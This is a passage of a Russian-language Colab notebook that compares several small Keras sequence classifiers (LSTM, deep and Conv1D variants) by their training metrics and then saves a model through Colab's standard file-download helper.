font-size=\"14.00\">lstm_4</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"102,-219.5 102,-255.5 \"/>\n<text text-anchor=\"middle\" x=\"128.5\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 139277066969648&#45;&gt;139277066819840 -->\n<g id=\"edge3\" class=\"edge\">\n<title>139277066969648-&gt;139277066819840</title>\n<path fill=\"none\" stroke=\"black\" d=\"M101.5,-292.31C101.5,-284.29 101.5,-274.55 101.5,-265.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"105,-265.53 101.5,-255.53 98,-265.53 105,-265.53\"/>\n</g>\n<!-- 139277067140208 -->\n<g id=\"node5\" class=\"node\">\n<title>139277067140208</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"41,-146.5 41,-182.5 162,-182.5 162,-146.5 41,-146.5\"/>\n<text text-anchor=\"middle\" x=\"70.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">dropout</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"100,-146.5 100,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"131\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dropout</text>\n</g>\n<!-- 139277066819840&#45;&gt;139277067140208 -->\n<g id=\"edge4\" class=\"edge\">\n<title>139277066819840-&gt;139277067140208</title>\n<path fill=\"none\" stroke=\"black\" d=\"M101.5,-219.31C101.5,-211.29 101.5,-201.55 101.5,-192.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"105,-192.53 101.5,-182.53 98,-192.53 105,-192.53\"/>\n</g>\n<!-- 139277067140832 -->\n<g id=\"node6\" class=\"node\">\n<title>139277067140832</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"46,-73.5 46,-109.5 157,-109.5 157,-73.5 46,-73.5\"/>\n<text text-anchor=\"middle\" x=\"76.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_7</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"107,-73.5 107,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"132\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277067140208&#45;&gt;139277067140832 -->\n<g id=\"edge5\" class=\"edge\">\n<title>139277067140208-&gt;139277067140832</title>\n<path fill=\"none\" stroke=\"black\" d=\"M101.5,-146.31C101.5,-138.29 101.5,-128.55 101.5,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"105,-119.53 101.5,-109.53 98,-119.53 105,-119.53\"/>\n</g>\n<!-- 139277067338512 -->\n<g id=\"node7\" class=\"node\">\n<title>139277067338512</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"46,-0.5 46,-36.5 157,-36.5 157,-0.5 46,-0.5\"/>\n<text text-anchor=\"middle\" x=\"76.5\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_8</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"107,-0.5 107,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"132\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277067140832&#45;&gt;139277067338512 -->\n<g id=\"edge6\" class=\"edge\">\n<title>139277067140832-&gt;139277067338512</title>\n<path fill=\"none\" stroke=\"black\" d=\"M101.5,-73.31C101.5,-65.29 101.5,-55.55 101.5,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"105,-46.53 101.5,-36.53 98,-46.53 105,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Функция отображения обучения"
      ],
      "metadata": {
        "id": "yUOy4iZ_zf5T"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import matplotlib.pyplot as plt\n",
        "import tensorflow.keras as keras\n",
        "\n",
        "colors = plt.rcParams['axes.prop_cycle'].by_key()['color']\n",
        "\n",
        "def plot_loss(epochs, history, label='', n=1, val=False):\n",
        "    plt.semilogy(epochs,  history['loss'],\n",
        "               color=colors[n], label='Train '+label)\n",
        "    if val:\n",
        "      plt.semilogy(epochs,  history['val_loss'],\n",
        "            color=colors[n], label='Val '+label,\n",
        "            linestyle=\"--\")\n",
        "    plt.xlabel('Epoch')\n",
        "    plt.ylabel('Loss')\n",
        "\n",
        "    plt.legend()"
      ],
      "metadata": {
        "id": "0jrmuomAiyZI"
      },
      "execution_count": 57,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**МЕТРИКИ**"
      ],
      "metadata": {
        "id": "LAqOIo5nzj12"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import f1_score\n",
        "\n",
        "METRICS = [\n",
        "    keras.metrics.TruePositives(name='tp'),\n",
        "    keras.metrics.FalsePositives(name='fp'),\n",
        "    keras.metrics.TrueNegatives(name='tn'),\n",
        "    keras.metrics.FalseNegatives(name='fn'),\n",
        "    # Precision: (TP) / (TP + FP)\n",
        "    keras.metrics.Precision(name='precision'),\n",
        "    # Recall: (TP) / (TP+FN)\n",
        "    keras.metrics.Recall(name='recall'),\n",
        "    keras.metrics.AUC(name='auc'),\n",
        "    keras.metrics.Accuracy(name='accuracy')\n",
        "    ]"
      ],
      "metadata": {
        "id": "M4jWDrZci2aE"
      },
      "execution_count": 58,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Пример обучения**"
      ],
      "metadata": {
        "id": "EaEjBmbYzsnT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "model = models['simplest']\n",
        "model.compile(optimizer='adam', loss='binary_crossentropy', metrics=METRICS)\n",
        "model.fit(train_Xds, epochs=5, verbose=1)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YqcUtnPRjIVJ",
        "outputId": "9139242b-f05e-469e-e78a-5960f4ab6e65"
      },
      "execution_count": 60,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Epoch 1/5\n",
            "8/8 [==============================] - 14s 803ms/step - loss: 0.6549 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 90.0000 - fn: 38.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.3918 - accuracy: 0.0000e+00\n",
            "Epoch 2/5\n",
            "8/8 [==============================] - 4s 438ms/step - loss: 0.6075 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 45.0000 - fn: 19.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.5573 - accuracy: 0.0000e+00\n",
            "Epoch 3/5\n",
            "8/8 [==============================] - 4s 448ms/step - loss: 0.5960 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 45.0000 - fn: 19.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.5977 - accuracy: 0.0000e+00\n",
            "Epoch 4/5\n",
            "8/8 [==============================] - 5s 609ms/step - loss: 0.5811 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 45.0000 - fn: 19.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.6462 - accuracy: 0.0000e+00\n",
            "Epoch 5/5\n",
            "8/8 [==============================] - 4s 456ms/step - loss: 0.5823 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 45.0000 - fn: 19.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.6275 - accuracy: 0.0000e+00\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<keras.callbacks.History at 0x7eabf1aa9c30>"
            ]
          },
          "metadata": {},
          "execution_count": 60
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "model.evaluate(val_Xds)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "u3QsWyR3jRNC",
        "outputId": "ca0918ae-2d9a-4691-9e63-b737b1da9de7"
      },
      "execution_count": 61,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "2/2 [==============================] - 1s 51ms/step - loss: 0.3939 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 16.0000 - fn: 0.0000e+00 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.0000e+00 - accuracy: 0.0000e+00\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[0.3939211368560791, 0.0, 0.0, 16.0, 0.0, 0.0, 0.0, 0.0, 0.0]"
            ]
          },
          "metadata": {},
          "execution_count": 61
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Выбор лучшей модели**"
      ],
      "metadata": {
        "id": "Sj-7Ei5jz-NE"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "for i, (name, model) in enumerate(models.items()):\n",
        "  print(f\"\\n{i}th model: {name}!\")\n",
        "  if name == 'bidirectional':\n",
        "    continue\n",
        "  OPT = keras.optimizers.Adam()\n",
        "  model.compile(optimizer=OPT, loss='binary_crossentropy', metrics=METRICS)\n",
        "\n",
        "  h = model.fit(train_Xds, epochs=5, verbose=0)\n",
        "  plt.figure(figsize=[8, 4])\n",
        "  plot_loss(h.epoch, h.history, f\"\\n{i}th model, {name}\", i)\n",
        "\n",
        "  results = model.evaluate(train_Xds)\n",
        "\n",
        "  for name, value in zip(model.metrics_names, results):\n",
        "    print(name, ': ', value)\n",
        "  print()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "uNcO6MngjXzH",
        "outputId": "2fa4f5d3-26bb-4fb3-ecfc-b2b90284ef7f"
      },
      "execution_count": 62,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "0th model: simplest!\n",
            "8/8 [==============================] - 1s 42ms/step - loss: 0.5084 - tp: 3.0000 - fp: 2.0000 - tn: 43.0000 - fn: 16.0000 - precision: 0.6000 - recall: 0.1579 - auc: 0.8497 - accuracy: 0.0000e+00\n",
            "loss :  0.5083916187286377\n",
            "tp :  3.0\n",
            "fp :  2.0\n",
            "tn :  43.0\n",
            "fn :  16.0\n",
            "precision :  0.6000000238418579\n",
            "recall :  0.15789473056793213\n",
            "auc :  0.8497076630592346\n",
            "accuracy :  0.0\n",
            "\n",
            "\n",
            "1th model: deep!\n",
            "8/8 [==============================] - 1s 41ms/step - loss: 0.5257 - tp: 3.0000 - fp: 0.0000e+00 - tn: 45.0000 - fn: 16.0000 - precision: 1.0000 - recall: 0.1579 - auc: 0.7848 - accuracy: 0.0000e+00\n",
            "loss :  0.5256754159927368\n",
            "tp :  3.0\n",
            "fp :  0.0\n",
            "tn :  45.0\n",
            "fn :  16.0\n",
            "precision :  1.0\n",
            "recall :  0.15789473056793213\n",
            "auc :  0.784795343875885\n",
            "accuracy :  0.0\n",
            "\n",
            "\n",
            "2th model: deeper!\n",
            "8/8 [==============================] - 1s 80ms/step - loss: 0.5406 - tp: 6.0000 - fp: 3.0000 - tn: 42.0000 - fn: 13.0000 - precision: 0.6667 - recall: 0.3158 - auc: 0.7152 - accuracy: 0.0000e+00\n",
            "loss :  0.5405935645103455\n",
            "tp :  6.0\n",
            "fp :  3.0\n",
            "tn :  42.0\n",
            "fn :  13.0\n",
            "precision :  0.6666666865348816\n",
            "recall :  0.31578946113586426\n",
            "auc :  0.7152045965194702\n",
            "accuracy :  0.0\n",
            "\n",
            "\n",
            "3th model: conv1d!\n",
            "8/8 [==============================] - 1s 7ms/step - loss: 0.5800 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 45.0000 - fn: 19.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.6953 - accuracy: 0.0000e+00  \n",
            "loss :  0.5800322890281677\n",
            "tp :  0.0\n",
            "fp :  0.0\n",
            "tn :  45.0\n",
            "fn :  19.0\n",
            "precision :  0.0\n",
            "recall :  0.0\n",
            "auc :  0.6953216791152954\n",
            "accuracy :  0.0\n",
            "\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Сохраним лучшую модель**"
      ],
      "metadata": {
        "id": "bdHzlfxMj93A"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from google.colab import files # для скачивания и загрузок файлов\n",
        "model_json = model.to_json()\n",
        "with open(\"model.json\",\"w\") as json_file:\n",
        "     json_file.write(model_json)\n",
        "files.download('model.json')\n",
        "model.save('weights.h5')\n",
        "files.download('weights.h5')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 17
        },
        "id": "dAgyZ0IQkDUx",
        "outputId": "9e20c2f2-a2d7-4e84-aa6c-a84b7fd73077"
      },
      "execution_count": 63,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "    async function download(id, filename, size) {\n",
              "      if (!google.colab.kernel.accessAllowed) {\n",
              "        return;\n",
              "      }\n",
              "      const div = document.createElement('div');\n",
              "      const label = document.createElement('label');\n",
              "      label.textContent = `Downloading \"${filename}\": `;\n",
              "      div.appendChild(label);\n",
              "      const progress = document.createElement('progress');\n",
              "      progress.max = size;\n",
              "      div.appendChild(progress);\n",
              "      document.body.appendChild(div);\n",
              "\n",
              "      const buffers = [];\n",
              "      let downloaded = 0;\n",
              "\n",
              "      const channel = await google.colab.kernel.comms.open(id);\n",
              "      // Send a message to notify the kernel that we're ready.\n",
              "      channel.send({})\n",
              "\n",
              "      for await (const message of channel.messages) {\n",
              "        // Send a message to notify the kernel that we're ready.\n",
              "        channel.send({})\n",
              "        if (message.buffers) {\n",
              "          for (const buffer of message.buffers) {\n",
              "            buffers.push(buffer);\n",
              "            downloaded += buffer.byteLength;\n",
              "            progress.value = downloaded;\n",
              "          }\n",
              "        }\n",
              "      }\n",
              "      const blob = new Blob(buffers, {type: 'application/binary'});\n",
              "      const a = document.createElement('a');\n",
              "      a.href = window.URL.createObjectURL(blob);\n",
              "      a.download = filename;\n",
              "      div.appendChild(a);\n",
              "      a.click();\n",
              "      div.remove();\n",
              "    }\n",
              "  "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "download(\"download_811e3cca-6e78-4597-b378-b8679db98b0c\", \"model.json\", 2891)"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "    async function download(id, filename, size) {\n",
              "      if (!google.colab.kernel.accessAllowed) {\n",
              "        return;\n",
              "      }\n",
              "      const div = document.createElement('div');\n",
              "      const label = document.createElement('label');\n",
              "      label.textContent = `Downloading \"${filename}\": `;\n",
              "      div.appendChild(label);\n",
              "      const progress = document.createElement('progress');\n",
              "      progress.max = size;\n",
              "      div.appendChild(progress);\n",
              "      document.body.appendChild(div);\n",
              "\n",
              "      const buffers = [];\n",
              "      let downloaded = 0;\n",
              "\n",
              "      const channel = await google.colab.kernel.comms.open(id);\n",
              "      // Send a message to notify the kernel that we're ready.\n",
              "      channel.send({})\n",
              "\n",
              "      for await (const message of channel.messages) {\n",
              "        // Send a message to notify the kernel that we're ready.\n",
              "        channel.send({})\n",
              "        if (message.buffers) {\n",
              "          for (const buffer of message.buffers) {\n",
              "            buffers.push(buffer);\n",
              "            downloaded += buffer.byteLength;\n",
              "            progress.value = downloaded;\n",
              "          }\n",
              "        }\n",
              "      }\n",
              "      const blob = new Blob(buffers, {type: 'application/binary'});\n",
              "      const a = document.createElement('a');\n",
              "      a.href = window.URL.createObjectURL(blob);\n",
              "      a.download = filename;\n",
              "      div.appendChild(a);\n",
              "      a.click();\n",
              "      div.remove();\n",
              "    }\n",
              "  "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "download(\"download_087e832a-138f-4319-8239-316a00162e48\", \"weights.h5\", 482760)"
            ]
          },
          "metadata": {}
        }
      ]
    }
  ]
}